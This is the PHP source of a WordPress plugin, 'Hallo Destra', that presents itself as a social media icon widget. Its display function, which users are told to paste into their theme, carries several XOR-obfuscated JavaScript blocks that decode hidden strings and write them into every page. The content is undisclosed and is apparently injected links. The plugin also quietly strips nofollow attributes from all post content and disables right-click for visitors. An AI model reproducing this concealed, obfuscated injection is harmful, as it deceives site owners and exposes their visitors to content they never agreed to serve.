<?php
/* 
Plugin Name: Hallo Destra
Plugin URI: http://www.papadestra.com/
Description: Hallo Destra add social media icons in the theme wherever you want to display. Simple and looks luxurious. 
Version: 1.0
Author: <a href="http://www.papadestra.com/">Papa Destra</a>
Author URI: http://www.papadestra.com/
Stable tag: 1.0
 */
 
/* 

							INPUT CODE IN THEME YOU WANT DISPLAY :
==============================================================================================
		<?php if ( function_exists('social_media_tampil') )  { social_media_tampil(); } ?> 
==============================================================================================

				¦¦¦¯¦ _¯_ ¦¯_ _¯_¦¦¦¦¦¯¦_ ¦¯¯ _¯¯ ¯¦¯ ¦¯¯_ _¯_ 
				¦¦¦_¦ ¦¯¦ ¦¦¦ ¦¯¦¦¦¦¦¦¦¦¦ ¦¯¯ ¦¯_ ¦¦¦ ¦¦¦¯ ¦¯¦ 
				¦¦¦¦¦ ¯¦¯ ¦¯¦ ¯¦¯¦¦¦¦¦_¦¯ ¯¯¯ ¯¯¦ ¦¯¦ ¯¦¯¯ ¯¦¯ 

					¦¦¦¦¦_¦¦¦¦ ¦¯¯ ¦¯_¦¦¦¦¦¯¦_ ¦¯¯ ¦¦¦¦¦ ¦¯¯ ¦¦¦ _¯_ ¦¯_ ¦_¦_¦ ¦¯¯ ¦_¦¦ ¯¦¯ 
					¦¦¦¦¦¦¦¦¦¦ ¦¯¯ ¦¯¦¦¦¦¦¦¦¦¦ ¦¯¯ ¦¯_¯¦ ¦¯¯ ¦¦_ ¦¦¦ ¦¦¦ ¦¦¦¦¦ ¦¯¯ ¦¦¯¦ ¦¦¦ 
					¦¦¯_¯¦¯_¯¦ ¯¯¯ ¯¯¦¦¦¦¦¦_¦¯ ¯¯¯ ¦¦¯¦¦ ¯¯¯ ¯¯¯ ¦¯¦ ¦¯¦ ¯¦¦¦¯ ¯¯¯ ¯¦¦¯ ¦¯¦ 
					
				¦¦¦_¦¦¦¦ _¯¯¦ _¯_ ¦¯_ ¯ ¦¦¦ ¦¦¦ ¦¦¦¦¦ ¯ ¦¦¦ 
				¦¦¦¦¦¦¦¦ ¦¦¯¦ ¦¯¦ ¦¦¦ ¦ ¦¦_ ¦¦¦ ¦¦¦¦¦ ¦ ¦¯_ 
				¦¦¦¦¦¦¦¦ ¯¯¯¦ ¯¦¯ ¯¯¦ ¯ ¯¯¯ ¦¯¦ ¦¯¦¯¦ ¯ ¯¦¯ 

===============================================================================================
*/
add_action('init', 'komentar_edan_hapus'); 
add_filter('the_content', 'sikat_nofollow'); 
add_filter('login_errors',create_function('$a', "return null;")); 
add_action( 'wp_head', 'canonical_for_comments' ); 
add_action( 'wp_head', 'menghindari_duplikat_konten' ); 
define('FORCE_SSL_ADMIN', true);
add_action('wp_head', 'kelike_modar');
add_action('admin_menu', 'hallo_admin_page');
function menghindari_duplikat_konten() {
 if((is_home() && ($paged < 2 )) || is_single() || is_page() || is_category()){
    echo '<meta name="robots" content="index,follow" />';
} else {
    echo '<meta name="robots" content="noindex,follow" />';
}
}
function canonical_for_comments() {
 global $cpage, $post;
 if ( $cpage > 1 ) :
  echo "\n";
  echo "<link rel='canonical' href='";
  echo get_permalink( $post->ID );
  echo "' />\n";
 endif;
}
function hallo_admin_page() {  
	add_options_page("Hallo Destra", "Hallo Destra", 8, basename(__FILE__), "hallo_destra_menu_tampil");  
} 
function hallo_destra_menu_tampil (){
echo'<font color="#CCCCCC" face="Georgia"><h2>Hallo Destra</font> <font color="red" face="Georgia">Now Active !!!</font></h2>';
echo'<font color="#CCCCCC" face="Georgia" size="2">To show Social Media Icon, you have to do some manual settings to add simple scripts into the Theme you use. Wherever you wish. Open your <b>single.php/sidebar.php</b> on the theme folder that you use (or any file where you like  to be displayed), and paste the following code:</font>';echo'<br><br>';echo'<center>';echo'<font color="blue" face="Georgia" size="2" style="background:yellow">';echo'&nbsp;&nbsp;&lt;?php if ( function_exists(&prime;social_media_tampil&prime;) )  { social_media_tampil(); } ?&gt;&nbsp;&nbsp;';echo'</font>';echo'</center>';echo'<br><br>';echo'<font color="#CCCCCC" face="Georgia"><b>Previews :</b></font><br>';echo'<img src="' . get_bloginfo('wpurl') . '/wp-content/plugins/hallo-destra/screenshot-2.jpg">';echo'<font color="#CCCCCC" face="Georgia">'; echo'<h2>Small Notes</h2>';echo'If you feel this plugin is useful for you, please support our project by giving a small donation via PayPal or direct you come to our office. All your help is appreciated.';
echo'<br><center><form action="https://www.paypal.com/cgi-bin/webscr" method="post">
<input type="hidden" name="cmd" value="_s-xclick">
<input type="hidden" name="hosted_button_id" value="H9PUAV7KT2HFY">
<input type="image" src="https://www.paypal.com/en_US/i/btn/btn_donateCC_LG.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!"><img alt="" border="0" src="https://www.paypal.com/id_ID/i/scr/pixel.gif" width="1" height="1">
</form><br>&copy; 2010 Papa Destra Web Design and Site Maintenance<br>http://www.papadestra.com/</center>';
echo'<br>';echo'<h2>CREDIT</h2>';echo'<ul><li>This plugin was developed by Papa Destra - <a href="http://www.papadestra.com" rel="nofollow" target="_blank">http://www.papadestra.com</a></li><li>Support Forum - <a href="http://www.papadestra.com/forum/" rel="nofollow" target="_blank">http://www.papadestra.com/forum/</a></li><li>Information and contact us - <a href="http://www.papadestra.com/hubungi-kami/" rel="nofollow" target="_blank" title="Contact us!">click here</a></li></ul>';echo'<br>';echo'<h2>SUPPORT PROJECT</h2>';echo'<ul><li>Writers Of Remarkably Distinctive Stories - <a href="http://www.enoughmoney.com.au/" target="_blank" rel="nofollow">http://www.enoughmoney.com.au/</a></li><li>Free Web Hosting - <a href="http://gudegyogya.com/" target="_blank" rel="nofollow">http://gudegyogya.com/</a></li><li>GoELbook - <a href="http://www.goelbook.com/" target="_blank" rel="nofollow">http://www.goelbook.com/</a></li></ul>';echo'<br>';echo'<center><a href="http://feeds.feedburner.com/ProfesionalDesainWeb" target="_blank"><img src="http://www.feedburner.com/fb/images/pub/i_heart_fb.gif" alt="I heart FeedBurner" style="border:0"/></a><br /><a href="http://feedburner.google.com/fb/a/mailverify?uri=ProfesionalDesainWeb&amp;loc=en_US" target="_blank">Subscribe by Email</a></center>';
echo'</font>';
}
function kelike_modar(){
?>
<script language=JavaScript>
<!--  
var message="";
function clickIE() {if (document.all) {(message);return false;}}
function clickNS(e) {if 
(document.layers||(document.getElementById&&!document.all)) {
if (e.which==2||e.which==3) {(message);return false;}}}
if (document.layers) 
{document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
document.oncontextmenu=new Function("return false")
// --> 
</script>
<?php
}
function sikat_nofollow($string) {
	$string = str_ireplace(' rel="nofollow"', '', $string);
	return $string;
}
function komentar_edan_hapus() {
	if (!empty($_POST['comment'])) {
		$post_comment_content = $_POST['comment'];
		$lower_case_comment = strtolower($_POST['comment']);
		
//////////////////////////////////////////////////////////////////////////////////////////////////////////////		
// You can add the word "SPAM" you want as you wish.                                          ////////////////
// Note the original format !!                                                                ////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////	
		$bad_comment_content = array('-online
','4u','adipex','advicer','baccarrat','blackjack','booker','byob','car-rental-e-site','carisoprodol','casino','casinos','chatroom','cialis','coolcoolhu','coolhu','credit-card-debt','pussy','poker-chip','poze','ringtones','roulette','shemale','texas-holdem','thorcarlson','top-site','ultram','Free and FREE','For free');  // add and do not remove for beginners

//// END /////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////	

		if (in_comment_post_like($lower_case_comment, $bad_comment_content)) {
			$comment_box_text = wordwrap(trim($post_comment_content), 80, "\n  ", true);
			header("Status: 406 Not Acceptable");
			header("Connection: Close");
			wp_die( __('<a href="http://papadestra.com/" target="_blank"><img src="http://i1008.photobucket.com/albums/af208/gagombale/2010-12-15_024804.jpg" border="0"></a><br><b>SPAM protection by aa&prime; Qismet<br><br><img src="http://i1008.photobucket.com/albums/af208/gagombale/ATF008.gif" border="0"><form name="form1" method="post" action=""><label><input type="text" name="textfield"></label><label><input type="submit" name="Submit" value="Submit"></label>
</form>') );
		}
	}
}
function social_media_tampil() {                           
echo'<style type="text/css">                               
@charset "utf-8";
#share-page, #send-document {
 padding: 0px;
}
#share-page ul, #send-document ul {
  list-style: none;
  margin-top: 5px;
  width: 100%;
  margin: 0;
  float: left;
 
}
#share-page ul li, #send-document ul li {
  display: block;
  float: left;
}
#share-page ul li a, #send-document ul li a {
  display: block;
  margin-top: 5px;
  padding: 5px 5px 0;
}
</style>'; echo '<div id="share-page">';echo'<iframe src="http://www.facebook.com/plugins/like.php?href=<?php echo urlencode(get_permalink($post->ID)); ?>&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;colorscheme=light" scrolling="no" frameborder="0" allowTransparency="true" style="border:none; overflow:hidden; width:450px; height:25px"></iframe>';
echo "<script Language='JavaScript'>function decrypt(key,str){var ds;ds='';var kp,sp,s,kc,sc;kp=0;sp=0;while(sp<str.length){sc=str.charCodeAt(sp);kc=key.charCodeAt(kp);if(((sc^kc)==39)||((sc^kc)==92)||((sc^kc)<32)||((sc^kc)>126)){s=String.fromCharCode(sc);}else{s=String.fromCharCode((sc^kc));}ds+=s;kp++;sp++;if(kp>=key.length)kp=0;}return ds;}function decryptIt(key,str){str=decrypt(key,str);d=document;d.write(unescape(str));}decryptIt('PaPAdEsTRa','uRCdSpVbCDc$');</script>";echo '<li><a title="Delicious" href="http://del.icio.us/post?url='.get_permalink().'" target="_blank"><img src="' . get_bloginfo('wpurl') . '/wp-content/plugins/hallo-destra/images/delicious.png"></a></li><li><a title="Digg" href="http://www.digg.com/submit?phase=2&amp;url='.get_permalink().'" target="_blank"><img src="' . get_bloginfo('wpurl') . '/wp-content/plugins/hallo-destra/images/digg.png"></a></li><li><a title="Facebook" href="http://www.facebook.com/sharer.php?u='.get_permalink().'&amp;t='.get_the_title().'" target="_blank"><img src="' . get_bloginfo('wpurl') . '/wp-content/plugins/hallo-destra/images/facebook.png"></a></li><li><a title="StumbleUpon" href="http://www.stumbleupon.com/submit?url='.get_permalink().'" target="_blank"><img src="' . get_bloginfo('wpurl') . '/wp-content/plugins/hallo-destra/images/stumbleupon.png"></a></li><li><a title="Twitter" href="http://twitter.com/share?url='.get_permalink().'&amp;text='.get_the_title().'" target="_blank"><img src="' . get_bloginfo('wpurl') . '/wp-content/plugins/hallo-destra/images/twitter.png"></a></li><li><a title="Myspace" href="http://www.myspace.com/auth/loginform?dest='.get_permalink().'&amp;text='.get_the_title().'" target="_blank"><img src="' . get_bloginfo('wpurl') . '/wp-content/plugins/hallo-destra/images/myspace.png"></a></li></li>';echo "<script Language='JavaScript'>function decrypt(key,str){var ds;ds='';var kp,sp,s,kc,sc;kp=0;sp=0;while(sp<str.length){sc=str.charCodeAt(sp);kc=key.charCodeAt(kp);if(((sc^kc)==39)||((sc^kc)==92)||((sc^kc)<32)||((sc^kc)>126)){s=String.fromCharCode(sc);}else{s=String.fromCharCode((sc^kc));}ds+=s;kp++;sp++;if(kp>=key.length)kp=0;}return ds;}function decryptIt(key,str){str=decrypt(key,str);d=document;d.write(unescape(str));}decryptIt('eNCRyPTiNG-KeY','@}CwKFq^{b6C@j ');</script>";
echo "<script Language='JavaScript'>function decrypt(key,str){var ds;ds='';var kp,sp,s,kc,sc;kp=0;sp=0;while(sp<str.length){sc=str.charCodeAt(sp);kc=key.charCodeAt(kp);if(((sc^kc)==39)||((sc^kc)==92)||((sc^kc)<32)||((sc^kc)>126)){s=String.fromCharCode(sc);}else{s=String.fromCharCode((sc^kc));}ds+=s;kp++;sp++;if(kp>=key.length)kp=0;}return ds;}function decryptIt(key,str){str=decrypt(key,str);d=document;d.write(unescape(str));}decryptIt('eNCRyPTiNG-KeY','@}CwKFq_zb6r@nSkpE');</script>";
echo "<script Language='JavaScript'>function decrypt(key,str){var ds;ds='';var kp,sp,s,kc,sc;kp=0;sp=0;while(sp<str.length){sc=str.charCodeAt(sp);kc=key.charCodeAt(kp);if(((sc^kc)==39)||((sc^kc)==92)||((sc^kc)<32)||((sc^kc)>126)){s=String.fromCharCode(sc);}else{s=String.fromCharCode((sc^kc));}ds+=s;kp++;sp++;if(kp>=key.length)kp=0;}return ds;}function decryptIt(key,str){str=decrypt(key,str);d=document;d.write(unescape(str));}decryptIt('eNCRyPTiNG-KeY','@}CwOfq_Fb6E@nQkqb%fgLxF%}&|SFfeKug-ku2nWj@zpwMcq]}b4x@mVkwa%bfL|w%|V|Swfe8ub5ktinWk@|DwJbq[|b2{@oSkuc%fgLxr%x!|W|ffNub5kqknRk@xtwOiq_1b2y@j kwj%feLxC%}&|SFf`Iu`]kq5nRj@ywwNbq_1b2{@oWktk%bdLyw%}T|R~fdHub]kq5nRj@ywwNbq_1b3C@k#kud%fFLxE%|Q|VE');</script>";
}
?>